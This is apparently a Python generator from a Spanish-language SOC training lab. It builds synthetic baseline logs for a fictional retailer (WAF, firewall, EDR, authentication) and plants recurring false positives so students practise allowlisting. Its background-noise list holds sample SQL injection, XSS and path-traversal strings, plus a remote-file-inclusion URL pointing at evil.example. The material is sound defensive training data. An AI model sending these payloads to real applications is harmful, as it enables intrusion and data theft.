r"""
baseline.py — Tráfico "normal" del negocio + actividad legítima ruidosa.

Dos objetivos pedagógicos:

1. Que las detecciones no sean triviales. Si el único evento del tenant es el
   ataque, cualquier query lo encuentra. Con ruido, el alumno tiene que escribir
   filtros de verdad.

2. Generar falsos positivos *reales* y recurrentes, para que en el Día 4 tengan
   que aplicar el patrón de exclusiones (allowlisting) en vez de aflojar la
   detección:

   FP-1  Escáner de vulnerabilidades interno: barre el WAF todas las madrugadas
         (más fuerte los martes) con firmas de SQLi/XSS desde 10.20.12.50
         → parece el recon del atacante.
   FP-2  SCCM/despliegue de software lanza `powershell.exe -enc <base64>` en
         estaciones, firmado por Microsoft, desde ccmexec.exe → parece la
         ejecución del atacante.
   FP-3  Job de respaldo nocturno usa 7z.exe sobre \\SRV-FILE-01\clientes y
         sube ~2 GB a un destino en la nube → parece la exfiltración.
   FP-4  Monitoreo (Zabbix) hace beaconing cada 60 s a un colector externo
         → parece C2.
   FP-5  Ráfagas de logon fallido de `svc_sql` por una contraseña vencida
         → parece password spraying.
   FP-6  El mismo escáner Nessus barre la red interna de madrugada: dispara firmas
         de scan y de host sweep DESDE UNA IP INTERNA → parece el escaneo lateral
         del atacante desde la DMZ.
   FP-7  Ruido de fondo de Internet: escaneos de puertos contra el perímetro a
         todas horas → si alertas de todo scan, tienes 50 alertas al día.
   FP-8  El EDR pone en cuarentena adware y ficheros de prueba todos los días
         → si alertas de toda prevención, no distingues el bloqueo que importa.
   FP-9  La exclusión EXC-SCCM-PkgCache se aplica legítimamente cada semana en
         los despliegues → la detección de "exclusión abusada" necesita tuning.
   FP-10 Portátiles que se desconectan: `agent_offline` a diario → no confundir
         con manipulación del agente.
"""

from __future__ import annotations

import random
from datetime import datetime, timedelta

from generators import (
    BENIGN_DST, ORG, SERVERS, USERS, WORKSTATIONS, Env, ruta_realista,
    auth_event, edr_agent_event, edr_network_event, edr_prevention_event,
    edr_process_event, fw_dns_event, fw_event, fw_threat_event, waf_event,
)

BENIGN_DOMAINS = [
    "www.microsoft.com", "login.microsoftonline.com", "outlook.office365.com",
    "www.google.com", "cdn.jsdelivr.net", "api.andinaretail.com",
    "update.adobe.com", "s3.amazonaws.com", "teams.microsoft.com",
]

BENIGN_PROCS = [
    ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
     "Google LLC"),
    ("OUTLOOK.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE",
     "Microsoft Corporation"),
    ("EXCEL.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
     "Microsoft Corporation"),
    ("Teams.exe", "C:\\Users\\%U%\\AppData\\Local\\Microsoft\\Teams\\Teams.exe",
     "Microsoft Corporation"),
    ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "Microsoft Corporation"),
    ("explorer.exe", "C:\\Windows\\explorer.exe", "Microsoft Corporation"),
    ("notepad.exe", "C:\\Windows\\System32\\notepad.exe", "Microsoft Corporation"),
    ("msedge.exe", "C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
     "Microsoft Corporation"),
]

# Mezcla realista de lo que recibe una aplicación web pública. La proporción
# importa: la mayoría es ruido de baja severidad, y la SQLi está presente pero
# SIEMPRE bloqueada — para que la única no bloqueada (la del ataque) destaque
# solo si el analista mira el código de respuesta HTTP.
def _ua_escaner(rng):
    return rng.choice([
        "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
        "sqlmap/1.8.2#stable (https://sqlmap.org)",
        "Mozilla/5.0 (Nikto/2.5.0)",
        "python-requests/2.31.0",
        "Go-http-client/1.1",
        "curl/8.4.0",
    ])

_ATAQUES_FONDO = [
    ("Illegal Resource Access",
     ["/wp-login.php", "/.env", "/admin", "/phpmyadmin/", "/.git/config",
      "/backup.sql", "/config.json", "/server-status"], 3, _ua_escaner),
    ("Web Scanner Detected",
     ["/", "/robots.txt", "/sitemap.xml", "/api/v1/", "/swagger.json"], 5, _ua_escaner),
    ("SQL Injection",
     ["/buscar?q=1%27+OR+%271%27%3D%271", "/producto/ver?id=1+UNION+SELECT+NULL",
      "/api/v1/precios?sku=1%27--", "/catalogo?seccion=1%3B+DROP+TABLE+users--"], 7, _ua_escaner),
    ("Cross Site Scripting",
     ["/buscar?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E",
      "/comentario?texto=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"], 6, _ua_escaner),
    ("Directory Traversal",
     ["/descargar?f=..%2F..%2F..%2Fetc%2Fpasswd",
      "/static/..%5C..%5Cwindows%5Cwin.ini"], 6, _ua_escaner),
    ("Bot Access Control",
     ["/catalogo", "/producto/ver", "/api/v1/precios"], 2,
     "Mozilla/5.0 (compatible; SemrushBot/7~bl)"),
    ("Remote File Inclusion",
     ["/index.php?page=http%3A%2F%2Fevil.example%2Fsh.txt"], 7, _ua_escaner),
    ("Protocol Anomaly",
     ["/", "/checkout"], 4, "Mozilla/5.0"),
]
_PESOS_FONDO = [30, 16, 16, 13, 9, 8, 4, 4]

# Cuentas de clientes de la tienda. Son las que aparecen en suser.
_CLIENTES = [
    "acastro", "mlopez", "jrodriguez", "ngomez", "fperalta", "srivas",
    "tmolina", "cbermudez", "ealvarez", "pquintero", "vsalazar", "iduran",
    "lmarin", "ocardenas", "wpineda", "ymejia", "bhurtado", "gnavarro",
]

PUBLIC_CLIENT_IPS = [
    "190.85.{}.{}", "181.49.{}.{}", "200.118.{}.{}", "186.28.{}.{}",
    "168.194.{}.{}", "45.230.{}.{}",
]


def _public_ip(rng: random.Random) -> str:
    return rng.choice(PUBLIC_CLIENT_IPS).format(rng.randint(1, 254), rng.randint(1, 254))


def _business_weight(ts: datetime) -> float:
    """Curva de actividad: pico 09:00-18:00, valle de madrugada."""
    h = ts.hour
    if 9 <= h <= 12:
        return 1.0
    if 13 <= h <= 18:
        return 0.95
    if 7 <= h <= 8 or 19 <= h <= 21:
        return 0.5
    return 0.12


def generate_baseline(env: Env, start: datetime, hours: int, eps_scale: float = 1.0):
    """Devuelve un dict {colector: [eventos...]} con `hours` horas de tráfico normal.

    Volumen aproximado por hora punta y eps_scale=1.0:
      waf ~900, fw ~700, edr ~450, auth ~120  → unos 2.100 eventos/hora
    """
    rng = random.Random(7000 + env.variant)
    out = {"waf": [], "fw": [], "edr": [], "auth": []}

    for h in range(hours):
        hour_start = start + timedelta(hours=h)
        w = _business_weight(hour_start) * eps_scale

        # ---------------- WAF: tráfico web público ----------------
        for _ in range(int(900 * w)):
            ts = hour_start + timedelta(seconds=rng.randint(0, 3599),
                                        microseconds=rng.randint(0, 999999))
            path = ruta_realista(rng)
            status = rng.choices([200, 200, 200, 302, 304, 404, 500],
                                 weights=[70, 10, 5, 6, 4, 4, 1])[0]
            # Las zonas privadas exigen sesión; el catálogo público no.
            privada = any(x in path for x in ("/cuenta/", "/carrito", "/checkout"))
            cuenta = rng.choice(_CLIENTES) if (privada or rng.random() < 0.28) else ""
            metodo = "POST" if path.startswith("/cuenta/login") else \
                     rng.choices(["GET", "POST"], weights=[85, 15])[0]
            cuerpo = ""
            if path == "/cuenta/login":
                # El WAF extrae los campos del formulario. La contraseña va
                # enmascarada: un log que guarde credenciales en claro es un
                # incidente en sí mismo, y conviene decirlo en voz alta en clase.
                cuenta = rng.choice(_CLIENTES)
                cuerpo = f"usuario={cuenta}&clave=%2A%2A%2A%2A%2A%2A&recordar=1"
                status = rng.choices([302, 302, 401], weights=[70, 15, 15])[0]
            out["waf"].append(waf_event(
                ts, _public_ip(rng), path, method=metodo,
                status=status, action="allow", account=cuenta, payload=cuerpo,
                bytes_in=rng.randint(300, 2500), bytes_out=rng.randint(500, 90000),
                rng=rng,
            ))

        # ── Ruido de ataque de fondo de Internet ──────────────────────────
        # Una tienda pública recibe esto todo el día. Es el pajar dentro del cual
        # hay que encontrar la aguja: la SQLi de la F2 que NO fue bloqueada.
        # Todo lo de aquí se bloquea o termina en 4xx, así que una detección que
        # exija respuesta HTTP exitosa no se ensucia con este ruido.
        for _ in range(int(28 * w)):
            ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
            firma, rutas, sev, ua = rng.choices(_ATAQUES_FONDO, weights=_PESOS_FONDO)[0]
            # 15 % de las políticas están en modo alerta, pero la aplicación
            # responde 403/404 igual: la acción del WAF por sí sola no basta
            # para saber si el ataque funcionó.
            if rng.random() < 0.15:
                accion, status = "alert", rng.choice([403, 404])
            else:
                accion, status = "block", 403
            out["waf"].append(waf_event(
                ts, _public_ip(rng), rng.choice(rutas),
                method="POST" if firma == "Remote File Inclusion" else "GET",
                status=status, action=accion, signature=firma, severity=sev,
                user_agent=ua(rng) if callable(ua) else ua,
                bytes_in=rng.randint(200, 1400), bytes_out=rng.randint(200, 900),
                rng=rng,
            ))

        # Ráfagas de credential stuffing contra el login (2-3 al día)
        if rng.random() < 0.09:
            origen = _public_ip(rng)
            inicio = hour_start + timedelta(seconds=rng.randint(0, 3000))
            for i in range(rng.randint(18, 45)):
                victima = rng.choice(_CLIENTES)
                out["waf"].append(waf_event(
                    inicio + timedelta(seconds=i * rng.randint(2, 6)),
                    origen, "/cuenta/login", method="POST",
                    status=rng.choices([401, 401, 401, 403], weights=[70, 15, 10, 5])[0],
                    action="alert" if i < 10 else "block",
                    signature="Credential Stuffing", severity=6,
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                    account=victima,
                    payload=f"usuario={victima}&clave=%2A%2A%2A%2A%2A%2A",
                    bytes_in=rng.randint(180, 320), bytes_out=rng.randint(90, 400),
                    rng=rng,
                ))

        # ---------------- Firewall: salida a Internet ----------------
        for _ in range(int(700 * w)):
            ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
            host, ip, _u = rng.choice(WORKSTATIONS)
            out["fw"].append(fw_event(
                ts, ip, rng.choice(BENIGN_DST),
                dst_port=rng.choice([443, 443, 443, 80, 993]),
                app=rng.choice(["ssl", "web-browsing", "ms-office365", "imap"]),
                action="allow", src_host=host,
                bytes_sent=rng.randint(500, 40000), bytes_recv=rng.randint(1000, 400000),
                src_zone="trust", rule="salida-internet", rng=rng,
            ))

        for _ in range(int(120 * w)):
            ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
            host, ip, _u = rng.choice(WORKSTATIONS)
            out["fw"].append(fw_dns_event(ts, ip, rng.choice(BENIGN_DOMAINS),
                                          f"104.18.{rng.randint(1,254)}.{rng.randint(1,254)}",
                                          rng=rng))

        # Tráfico interno hacia los servidores
        for _ in range(int(150 * w)):
            ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
            host, ip, _u = rng.choice(WORKSTATIONS)
            srv, sip, _r = rng.choice(SERVERS[2:])
            out["fw"].append(fw_event(
                ts, ip, sip, dst_port=rng.choice([445, 1433, 3389, 88]),
                app=rng.choice(["ms-ds-smb", "mssql-db", "rdp", "kerberos"]),
                action="allow", src_host=host, src_zone="trust", dst_zone="datacenter",
                rule="lan-a-datacenter",
                bytes_sent=rng.randint(2000, 90000), bytes_recv=rng.randint(2000, 500000),
                rng=rng,
            ))

        # ---------------- EDR: procesos benignos ----------------
        for _ in range(int(450 * w)):
            ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
            host, ip, user = rng.choice(WORKSTATIONS)
            pname, ppath, signer = rng.choice(BENIGN_PROCS)
            ppath = ppath.replace("%U%", user)
            out["edr"].append(edr_process_event(
                ts, host, ip, proc_name=pname, proc_path=ppath,
                cmdline=f'"{ppath}"', user=f"{'ANDINA'}\\{user}",
                signer=signer, signed=True, rng=rng,
            ))

        for _ in range(int(200 * w)):
            ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
            host, ip, user = rng.choice(WORKSTATIONS)
            pname, ppath, _s = rng.choice(BENIGN_PROCS[:4])
            out["edr"].append(edr_network_event(
                ts, host, ip, proc_name=pname, proc_path=ppath.replace("%U%", user),
                remote_ip=rng.choice(BENIGN_DST), remote_port=443,
                domain=rng.choice(BENIGN_DOMAINS),
                bytes_sent=rng.randint(500, 20000), bytes_recv=rng.randint(1000, 200000),
                user=f"ANDINA\\{user}", rng=rng,
            ))

        # ---------------- Autenticación ----------------
        for _ in range(int(120 * w)):
            ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
            host, ip, user = rng.choice(WORKSTATIONS)
            fail = rng.random() < 0.06
            out["auth"].append(auth_event(
                ts, user,
                outcome="failure" if fail else "success",
                reason="bad_password" if fail else "",
                src_ip=ip, src_host=host, rng=rng,
            ))

        # ---------------- Falsos positivos plantados ----------------
        _inject_false_positives(out, env, hour_start, rng)

    for k in out:
        out[k].sort()
    return out


def _inject_false_positives(out: dict, env: Env, hour_start: datetime,
                            rng: random.Random) -> None:
    h = hour_start.hour
    dow = hour_start.weekday()  # 0=lunes

    # FP-1 — escáner de vulnerabilidades interno.
    # Barrido ligero TODAS las madrugadas (así siempre cae dentro de una ventana
    # de 48 h) y barrido completo los martes.
    if 2 <= h < 4:
        intensidad = 180 if dow == 1 else 45
        for _ in range(intensidad):
            ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
            sig = rng.choice(["SQL Injection", "Cross Site Scripting",
                              "Directory Traversal", "Web Scanner Detected"])
            out["waf"].append(waf_event(
                ts, "10.20.12.50",
                rng.choice(["/buscar", "/api/v1/precios", "/cuenta/login", "/checkout"]),
                method="GET", status=403, action="block", signature=sig, severity=7,
                user_agent="Nessus/10.7.4 (SCANNER-ANDINA-01)", rng=rng,
            ))

    # FP-2 — despliegue de software vía SCCM (miércoles 22:00): PowerShell codificado
    if dow == 2 and h == 22:
        for host, ip, user in WORKSTATIONS:
            ts = hour_start + timedelta(seconds=rng.randint(0, 1800))
            out["edr"].append(edr_process_event(
                ts, host, ip,
                proc_name="powershell.exe",
                proc_path="C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                cmdline=("powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand "
                         "SQBuAHMAdABhAGwAbAAtAFAAYQBjAGsAYQBnAGUAIAAtAE4AYQBtAGUAIABBAGQAbwBiAGUA"),
                user="NT AUTHORITY\\SYSTEM",
                parent_name="CcmExec.exe",
                parent_path="C:\\Windows\\CCM\\CcmExec.exe",
                parent_cmdline="C:\\Windows\\CCM\\CcmExec.exe",
                ancestry=["services.exe", "CcmExec.exe", "powershell.exe"],
                signer="Microsoft Corporation", signed=True, integrity="high", rng=rng,
            ))

    # FP-3 — respaldo nocturno: 7z sobre el share de clientes + subida grande
    if h == 1:
        ts = hour_start + timedelta(minutes=rng.randint(0, 40))
        srv, sip, _ = SERVERS[5]  # SRV-BKP-01
        out["edr"].append(edr_process_event(
            ts, srv, sip,
            proc_name="7z.exe", proc_path="C:\\Program Files\\7-Zip\\7z.exe",
            cmdline=("\"C:\\Program Files\\7-Zip\\7z.exe\" a -t7z -mx1 "
                     "E:\\backup\\clientes_%DATE%.7z \\\\SRV-FILE-01\\clientes\\"),
            user="ANDINA\\svc_backup",
            parent_name="taskeng.exe", parent_path="C:\\Windows\\System32\\taskeng.exe",
            parent_cmdline="taskeng.exe {BACKUP-NIGHTLY}",
            ancestry=["svchost.exe", "taskeng.exe", "7z.exe"],
            signer="Igor Pavlov", signed=True, rng=rng,
        ))
        for i in range(35):
            out["fw"].append(fw_event(
                ts + timedelta(minutes=i), sip, "52.216.113.40", dst_port=443,
                app="amazon-s3", action="allow", src_host=srv, src_zone="datacenter",
                rule="backup-cloud",
                bytes_sent=rng.randint(50_000_000, 70_000_000),
                bytes_recv=rng.randint(20_000, 90_000), rng=rng,
            ))

    # FP-4 — monitoreo Zabbix: beaconing legítimo cada 60 s
    for m in range(0, 60, 5):
        ts = hour_start + timedelta(minutes=m)
        srv, sip, _ = SERVERS[1]
        out["fw"].append(fw_event(
            ts, sip, "159.89.214.31", dst_port=10051, app="zabbix-agent",
            action="allow", src_host=srv, src_zone="dmz", rule="monitoreo-saliente",
            bytes_sent=rng.randint(1180, 1260), bytes_recv=rng.randint(180, 220),
            rng=rng,
        ))

    # FP-6 — el escáner interno también barre la red, no solo el WAF
    if 2 <= h < 4:
        for i, destino in enumerate(["10.20.40.5", "10.20.40.21", "10.20.40.31",
                                     "10.20.30.11", "10.20.30.12"]):
            ts = hour_start + timedelta(minutes=i * 9 + rng.randint(0, 5))
            out["fw"].append(fw_threat_event(
                ts, "10.20.12.50", destino, "port_scan",
                dst_port=0, app="unknown", action="alert",
                src_zone="trust", dst_zone="datacenter",
                rule="escaneo-autorizado", repeat=rng.randint(30, 60),
                src_host="SCANNER-ANDINA-01", rng=rng,
            ))
        out["fw"].append(fw_threat_event(
            hour_start + timedelta(minutes=50), "10.20.12.50", "10.20.40.0",
            "host_sweep", dst_port=445, app="unknown", action="alert",
            src_zone="trust", dst_zone="datacenter", rule="escaneo-autorizado",
            repeat=64, src_host="SCANNER-ANDINA-01", rng=rng,
        ))

    # FP-7 — ruido de fondo de Internet contra el perímetro, a todas horas
    for _ in range(rng.randint(2, 5)):
        ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
        origen = f"{rng.choice([80, 89, 92, 141, 167, 196])}.{rng.randint(1,254)}." \
                 f"{rng.randint(1,254)}.{rng.randint(1,254)}"
        out["fw"].append(fw_threat_event(
            ts, origen, f"10.20.30.{rng.choice([11, 12])}",
            rng.choice(["port_scan", "host_sweep"]),
            dst_port=0, app="unknown", action="block",
            src_zone="untrust", dst_zone="dmz", rule="denegar-entrante",
            repeat=rng.randint(4, 25), rng=rng,
        ))
    # Intentos de fuerza bruta genéricos contra el perímetro (bots de Internet)
    if rng.random() < 0.35:
        ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
        origen = f"{rng.choice([103, 118, 194, 212])}.{rng.randint(1,254)}." \
                 f"{rng.randint(1,254)}.{rng.randint(1,254)}"
        out["fw"].append(fw_threat_event(
            ts, origen, "10.20.30.11",
            rng.choice(["ssh_brute", "rdp_brute"]),
            dst_port=rng.choice([22, 3389]), app=rng.choice(["ssh", "rdp"]),
            action="reset-both", src_zone="untrust", dst_zone="dmz",
            rule="denegar-entrante", repeat=rng.randint(10, 40), rng=rng,
        ))

    # FP-8 — prevenciones cotidianas del EDR
    if rng.random() < 0.45:
        ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
        host, ip, user = rng.choice(WORKSTATIONS)
        caso = rng.choice([
            ("quarantine", "Adware detectado en instalador descargado", "pup",
             "setup_installer.exe", "C:\\Users\\%U%\\Downloads\\setup_installer.exe"),
            ("quarantine", "Archivo de prueba EICAR", "malicious",
             "eicar.com", "C:\\Users\\%U%\\Downloads\\eicar.com"),
            ("block", "Macro de Office bloqueada por política", "suspicious",
             "WINWORD.EXE",
             "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"),
            ("remediate", "Extensión de navegador no permitida", "pup",
             "chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
        ])
        accion, regla, veredicto, proc, ruta = caso
        out["edr"].append(edr_prevention_event(
            ts, host, ip, action=accion, rule_name=regla, verdict=veredicto,
            engine=rng.choice(["signature", "ml", "behavioral"]),
            severity=rng.choice(["low", "medium"]),
            proc_name=proc, proc_path=ruta.replace("%U%", user),
            cmdline=f'"{ruta.replace("%U%", user)}"',
            file_path=ruta.replace("%U%", user),
            user=f"{ORG}\\{user}", rng=rng,
        ))

    # FP-9 — la exclusión de PkgCache se usa legítimamente en cada despliegue
    if dow == 2 and h == 22:
        for host, ip, user in WORKSTATIONS[:4]:
            ts = hour_start + timedelta(seconds=rng.randint(0, 1800))
            out["edr"].append(edr_prevention_event(
                ts, host, ip, action="allow_by_exception",
                rule_name="Ejecutable no firmado descargado por intérprete de scripts",
                verdict="suspicious", engine="ml", severity="medium",
                proc_name="AdobeSetup.exe",
                proc_path="C:\\ProgramData\\PkgCache\\AdobeSetup.exe",
                cmdline="C:\\ProgramData\\PkgCache\\AdobeSetup.exe /quiet",
                file_path="C:\\ProgramData\\PkgCache\\AdobeSetup.exe",
                user="NT AUTHORITY\\SYSTEM",
                exception_name="EXC-SCCM-PkgCache",
                exception_scope="C:\\ProgramData\\PkgCache\\*",
                rng=rng,
            ))

    # FP-10 — portátiles que se desconectan
    if rng.random() < 0.3:
        ts = hour_start + timedelta(seconds=rng.randint(0, 3599))
        host, ip, user = rng.choice(WORKSTATIONS)
        out["edr"].append(edr_agent_event(
            ts, host, ip, action="agent_offline", outcome="succeeded",
            detail="El agente perdió conectividad con la consola",
            severity="low", rng=rng,
        ))

    # FP-5 — svc_sql con contraseña vencida: ráfaga de fallos cada mañana
    if h == 8:
        ts = hour_start + timedelta(minutes=rng.randint(0, 20))
        for i in range(12):
            out["auth"].append(auth_event(
                ts + timedelta(seconds=i * 7), "svc_sql",
                outcome="failure", reason="password_expired",
                src_ip="10.20.40.31", src_host="SRV-SQL-01",
                dst_ip="10.20.40.5", dst_host="SRV-DC-01",
                protocol="ntlm", mfa=False, app="sql-service", rng=rng,
            ))
